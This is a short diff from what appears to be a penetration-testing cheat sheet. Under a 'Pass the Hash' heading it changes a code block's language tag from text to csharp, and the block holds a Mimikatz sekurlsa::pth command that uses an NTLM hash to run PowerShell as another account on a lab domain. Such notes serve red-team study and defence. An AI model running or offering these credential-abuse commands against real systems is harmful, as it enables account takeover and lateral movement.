@@ -58,7 +58,7 @@ privilege::debug
 
 ## Pass the Hash
 
-```text
+```csharp
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:targetaccount /domain:test.lab.local /ntlm:b38ff50
 264bc43012185d82c69794a4d8 /run:powershell.exe"'
 ```
